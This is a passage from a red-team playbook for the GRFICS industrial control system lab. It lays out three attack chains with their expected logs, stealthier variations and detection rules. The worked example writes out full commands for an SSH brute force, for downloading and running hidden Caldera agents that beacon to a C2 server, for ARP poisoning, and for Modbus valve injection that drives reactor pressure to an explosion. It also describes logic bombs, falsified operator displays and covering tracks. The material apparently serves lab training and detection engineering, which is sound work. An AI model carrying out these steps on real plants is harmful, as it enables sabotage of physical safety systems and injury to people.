| OpenPLC web auth | PLC application | `./shared_logs/plc/plc_app/` | HTTP POST to `/dashboard` with credentials in Tomcat access log |
| PLC program download | PLC application | `./shared_logs/plc/plc_app/` | HTTP GET `/upload-program` from unexpected source IP (95.5 instead of expected admin IP) |
| PLC program upload | PLC application | `./shared_logs/plc/plc_app/` | HTTP POST `/upload-program` with multipart form data; .st file name change |
| PLC restart | PLC syslog | `./shared_logs/plc/syslog` | OpenPLC service restart event; process recompilation log |
| Pressure climb | Simulation alarms | `./shared_logs/simulation/process_alarms` | Progressive pressure alarm events; no operator response correlatable to HMI |
| PLC audit | PLC audit | `./shared_logs/plc/audit` | Auditd: execve of compiler for .st file; file write to PLC program directory |

### Chain 3 Telemetry

| Attack Step | Log Source | Log File | Expected Event |
|-------------|-----------|----------|----------------|
| FC 0x17 overflow frame | Router Suricata | `./shared_logs/router/` | Oversized Modbus response frame (>260 bytes in response); Suricata rule for malformed Modbus PDU |
| PLC crash/restart | PLC syslog | `./shared_logs/plc/syslog` | OpenPLC daemon crash (SIGSEGV); systemd restart event |
| Reverse shell | PLC syslog | `./shared_logs/plc/syslog` | `/bin/bash` launched by OpenPLC process user (anomalous parent→child relationship) |
| Caldera agent install | PLC audit | `./shared_logs/plc/audit` | `curl` execution; file write to `/tmp/`; crontab modification (`cron.d` or `/var/spool/cron`) |
| Agent beaconing | Router Suricata | `./shared_logs/router/` | Unexpected outbound HTTP from 95.2 to 90.250:8888 (PLC should never initiate HTTP connections) |
| Process manipulation | Simulation alarms | `./shared_logs/simulation/process_alarms` | Pressure/valve alarms; continuous cycling if agent persists |

---

## 5. Variations and Escalation Paths

### Chain 1 Variations

| Variation | Description | Noisier/Stealthier |
|-----------|-------------|-------------------|
| **Slow drip injection** | Instead of hard-zeroing the purge valve, gradually shift it by 5% per hour over 12 hours. The process drifts out of safe range slowly, mimicking a mechanical failure. | ✅ Stealthier — harder to distinguish from sensor drift |
| **Direct simulation API attack** | Skip Modbus entirely; connect directly to `simulation:55555` and issue JSON write commands. Bypasses PLC control loop entirely. | ⚡ Noisier — unusual port connection from HMI |
| **Timing the attack to maintenance windows** | Read the ScadaLTS HMI schedules (if accessible); inject during known shift changes when operator attention is reduced. | ✅ Stealthier — reduced operator response likelihood |

**Escalation Path — Chain 1:**
Combine ARP poisoning with process manipulation: while injecting bad commands to the simulation, also intercept and rewrite HMI Modbus read responses in-flight to display falsified safe values. This achieves simultaneous **Loss of View** (T0829) + **Manipulation of Control** (T0831) — the operator sees normal readings on ScadaLTS while the reactor is at 3150 kPa. Add a timed delay before the attack peaks to create an alibi window.

---

### Chain 2 Variations

| Variation | Description | Noisier/Stealthier |
|-----------|-------------|-------------------|
| **Logic bomb** | Upload a program with a time-delayed trigger (`IF current_time > attack_time THEN remove_interlock`). Attacker logs out; sabotage activates hours later. | ✅ Stealthier — no correlation between access event and process event |
| **Partial modification** | Only remove the *emergency stop* response, not the normal PID loop. Process still operates normally under moderate conditions but will fail to recover from any disturbance. | ✅ Stealthier — process looks normal until a natural disturbance occurs |

**Escalation Path — Chain 2:**
After uploading the malicious program, also modify the HMI ScadaLTS data source to poll values from a spoofed Modbus responder rather than the real PLC. This means the HMI displays the "expected" values from the original safe program even while the malicious program is running. Requires setting up a fake Modbus server on EWS that replays pre-recorded safe measurements.

---

### Chain 3 Variations

| Variation | Description | Noisier/Stealthier |
|-----------|-------------|-------------------|
| **No Caldera agent — ephemeral exploit** | Execute process manipulation directly from the overflow payload via shellcode. No agent binary written to disk; entirely memory-resident. | ✅ Stealthier — no file IOCs, no cron entry |
| **Exploit simulation instead of PLC** | The simulation container also exposes TCP 55555 with no auth. A simpler buffer-size attack or malformed JSON could crash or manipulate the simulation backend without needing Modbus at all. | ⚡ Noisier from a protocol standpoint but avoids the Modbus layer |

**Escalation Path — Chain 3:**
With a persistent Caldera agent on the PLC, combine Chains 2 and 3: use the agent to upload a malicious PLC program (replacing the legitimate one) via the OpenPLC web API locally (loopback, bypassing any network firewall rules), then cover tracks by restoring original program metadata. This means the malicious program runs but the OpenPLC web interface shows the original filename and timestamp.

---

## 6. Fully Worked End-to-End Example: Chain 1 from Start to Explosion

### Prerequisites Checklist

```
☐ docker-compose up -d (all services running)
☐ chmod +x init_shared_logs.sh && ./init_shared_logs.sh
☐ Caldera server running at 192.168.90.250:8888
☐ Caldera UI accessible at http://localhost:8888 (credentials: admin/admin)
☐ Kali container running with Caldera agent pre-deployed:
    docker exec kali /tmp/.svc \
      -server http://192.168.90.250:8888 \
      -group kali -v &
```

### Execution Timeline

#### T+0:00 — Stage 1: SSH Brute Force on HMI

```bash
# From Caldera UI: trigger ability ssh-brute-hmi on group=kali
# OR manually from kali container:
docker exec -it kali bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      ssh://192.168.90.107 -t 4 -V

# Expected result:
# [22][ssh] host: 192.168.90.107   login: admin   password: admin
```

**Log generated:** `./shared_logs/hmi/auth.log`
```
Mar 24 10:00:01 hmi sshd[1234]: Failed password for admin from 192.168.90.6 port 34521 ssh2
Mar 24 10:00:03 hmi sshd[1234]: Failed password for admin from 192.168.90.6 port 34522 ssh2
[... 47 failures ...]
Mar 24 10:02:15 hmi sshd[1234]: Accepted password for admin from 192.168.90.6 port 34569 ssh2
```

#### T+2:15 — Stage 2: Deploy Caldera Agent on HMI

```bash
# From kali (90.6) → SSH into HMI:
ssh admin@192.168.90.107

# Deploy agent:
curl -s http://192.168.90.250:8888/file/download \
     -H "file:sandcat.go-linux" -H "platform:linux" \
     -o /tmp/.tomcat_update && chmod +x /tmp/.tomcat_update
/tmp/.tomcat_update -server http://192.168.90.250:8888 \
                    -group hmi -v > /dev/null 2>&1 &

# Verify in Caldera UI: Agents → hmi agent appears in group "hmi"
```

#### T+2:45 — Stage 3: ICS Network Discovery

```bash
# Caldera triggers nmap-ics-net ability on group=hmi
# From HMI (90.107):
nmap -sV -p 22,80,502,8080,55555 --open -oN /tmp/ics_scan.txt \
     192.168.95.0/24
```

**Expected output:**
```
192.168.95.2  (plc)
  22/open   ssh     OpenSSH 7.2
  502/open  modbus
  8080/open http    OpenPLC 2.0

192.168.95.5  (ews)
  22/open   ssh     OpenSSH 7.2
  6080/open http    VNC/noVNC

192.168.95.10 (simulation)
  80/open   http    Unity visualization
  55555/open        unknown (JSON API)
```

**Log generated:** `./shared_logs/router/eve.json` (Suricata)
```json
{"event_type":"alert","alert":{"signature":"ET SCAN Nmap Scripting Engine User-Agent Detected","severity":2},"src_ip":"192.168.90.107","dest_ip":"192.168.95.2"}
```

#### T+5:00 — Stage 3b: Modbus Tag Enumeration

```bash
# Caldera triggers modbus-enum-plc on group=hmi
# pymodbus script enumerates unit IDs 1-5 and register blocks
# Output saved to /tmp/modbus_map.json

# Key discovery:
# Unit 1, registers 0-13: process measurements
# Unit 3, register 2: purge valve position (write = T0836 target)
# Unit 4, register 3: product valve position (write = T0836 target)
```

**Log generated:** `./shared_logs/router/eve.json`
```json
{"event_type":"alert","alert":{"signature":"ET SCADA Modbus Read Holding Registers Attempt","severity":3},"src_ip":"192.168.90.107","dest_ip":"192.168.95.2","dest_port":502}
```

#### T+7:00 — Stage 4: Process Baseline Collection

```bash
# modbus-read-baseline ability on group=hmi
# Sample output:
{
  "pressure": 1850,        ← current reactor pressure (kPa)
  "liquidlevel": 4200,
  "purgevalvepos": 45,     ← purge valve 45% open (normal)
  "productvalvepos": 62,   ← product valve 62% open (normal)
  "simulation_api": {
    "process": "simpleTE",
    "outputs": {"pressure": 18.50, ...}
  }
}
```

#### T+9:00 — Stage 5: Lateral Movement HMI → EWS

```bash
# ssh-lateral-ews ability on group=hmi
ssh admin@192.168.95.5  # credential reuse: admin/admin
# Deploy agent on EWS
curl -s http://192.168.90.250:8888/file/download \
     -H "file:sandcat.go-linux" -H "platform:linux" \
     -o /tmp/.svc && chmod +x /tmp/.svc
/tmp/.svc -server http://192.168.90.250:8888 -group ews -v &
```

**Log generated:** `./shared_logs/ews/auth.log`
```
Mar 24 10:09:01 ews sshd[2100]: Accepted password for admin from 192.168.90.107 port 54321 ssh2
```

#### T+11:00 — Stage 6: ARP Poisoning (Operator Blinding)

```bash
# arp-poison-hmi-plc ability on group=ews
# From EWS (95.5), which is on b-ics-net with PLC (95.2)
# Note: HMI is on c-dmz-net; ARP poisoning between EWS and PLC
# disrupts the EWS→PLC Modbus path (engineering access blind)
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.95.2 192.168.95.5 &   # Tell PLC we are EWS
arpspoof -i eth0 -t 192.168.95.5 192.168.95.2 &   # Tell EWS we are PLC
```

**Log generated:** `./shared_logs/ews/kern.log`
```
[12345.678] ews kernel: eth0: Promiscuous mode enabled
[12346.001] ews kernel: neighbour: arp_cache: neighbour table overflow!
```

#### T+12:00 — Stage 7: Modbus Command Injection (IMPACT)

```bash
# modbus-inject-valves ability on group=ews
# This is the ICS impact step
python3 modbus_inject.py
```

**Live console output:**
```
[*] Injecting malicious valve setpoints...
[*] Current pressure: 1850 kPa (limit: 3200)
[*] Current pressure: 1923 kPa (limit: 3200)
[*] Current pressure: 2156 kPa (limit: 3200)
[*] Current pressure: 2489 kPa (limit: 3200)
[*] Current pressure: 2801 kPa (limit: 3200)
[*] Current pressure: 3055 kPa (limit: 3200)
[!] CRITICAL: Approaching safety limit!
[*] Current pressure: 3200 kPa (limit: 3200)
[!] EXPLOSION EVENT — simulation visualization triggered
```

**Logs generated simultaneously:**

`./shared_logs/simulation/process_alarms`:
```
2026-03-24T10:12:45 ALARM HIGH_PRESSURE pressure=2800.0 limit=2800 status=WARNING
2026-03-24T10:13:02 ALARM HIGH_PRESSURE pressure=3100.0 limit=3200 status=CRITICAL
2026-03-24T10:13:15 ALARM HIGH_PRESSURE pressure=3200.0 limit=3200 status=EXPLOSION
```

`./shared_logs/router/eve.json`:
```json
{"timestamp":"2026-03-24T10:12:00","event_type":"alert",
 "alert":{"signature":"ET SCADA Modbus Write Holding Registers Attempt",
          "severity":1},
 "src_ip":"192.168.95.5","dest_ip":"192.168.95.2","dest_port":502}
```

`./shared_logs/plc/audit`:
```
type=SYSCALL msg=audit(1711274945.123:456): arch=c000003e syscall=1 
success=yes exit=4 a0=5 a1=7f1234567890 a2=4 items=0 ppid=1 pid=234 
auid=0 uid=0 gid=0 comm="openplc" exe="/usr/bin/openplc"
```

---

## 7. Detection Engineering Summary

For the SOC team consuming logs via Elasticsearch/Kibana, here are the key correlation rules:

```
RULE 1 — Brute Force + Lateral Movement
  WHEN hmi/auth.log: >10 failed SSH in 60s from same src_ip
  THEN hmi/auth.log: successful SSH from same src_ip
  THEN ews/auth.log: successful SSH from hmi_ip within 300s
  → ALERT: Credential Brute Force followed by Lateral Movement

RULE 2 — Unexpected Modbus Source
  WHEN router/suricata: Modbus TCP to 95.2 or 95.10
  FROM src_ip NOT IN [known_hmi_ips, known_scada_ips]
  → ALERT: Unauthorized Modbus Access Attempt

RULE 3 — PLC Program Modification
  WHEN plc/plc_app: HTTP POST /upload-program
  FROM src_ip NOT IN [authorized_engineering_ips]
  → ALERT: Unauthorized PLC Program Upload

RULE 4 — Process Alarm Correlation with Network Event
  WHEN simulation/process_alarms: pressure > 2800
  AND router/suricata: Modbus write within preceding 300s
  FROM src_ip in [non-plc-ips]
  → ALERT: Potential ICS Process Manipulation via Modbus

RULE 5 — Buffer Overflow Indicator
  WHEN router/suricata: Modbus FC=0x17 with payload > 260 bytes
  THEN plc/syslog: OpenPLC crash/restart within 30s
  → ALERT: Possible libmodbus Buffer Overflow Exploit

RULE 6 — Unexpected Outbound HTTP from PLC
  WHEN router/suricata: HTTP connection FROM 192.168.95.2
  TO ANY DEST (PLC should NEVER initiate HTTP)
  → ALERT: C2 Beaconing from PLC — Critical IOC
```

---

## 8. Quick Reference: Caldera Operation Templates

```yaml
# ── OPERATION TEMPLATE: All 3 Chains ──────────────────────────────────────
operations:
  
  chain1:
    name: "GRFICS-Chain1-Modbus-Injection"
    adversary: "chain1-grfics-modbus-injection"
    planner: sequential
    groups: [kali, hmi, ews]
    facts:
      - {trait: plc.ip, value: "192.168.95.2"}
      - {trait: sim.ip, value: "192.168.95.10"}
      - {trait: ews.ip, value: "192.168.95.5"}
      - {trait: hmi.ip, value: "192.168.90.107"}

  chain2:
    name: "GRFICS-Chain2-PLC-Reprogramming"
    adversary: "chain2-grfics-plc-reprogram"
    planner: sequential
    groups: [kali, hmi, ews]
    facts:
      - {trait: openplc.url, value: "http://192.168.95.2:8080"}
      - {trait: openplc.user, value: "openplc"}
      - {trait: openplc.pass, value: "openplc"}

  chain3:
    name: "GRFICS-Chain3-BOF-RCE-Implant"
    adversary: "chain3-grfics-bof-rce"
    planner: sequential
    groups: [kali, hmi, plc]
    facts:
      - {trait: plc.ip, value: "192.168.95.2"}
      - {trait: plc.modbus.port, value: "502"}
      - {trait: caldera.c2, value: "http://192.168.90.250:8888"}
      - {trait: bof.read_count, value: "150"}
```

This playbook gives a security engineering team everything needed to reproduce all three attack chains in the GRFICS environment, observe the resulting process impacts in the Unity 3D visualization, and use the expected telemetry patterns to build and validate detection rules in Kibana against the Elasticsearch log pipeline.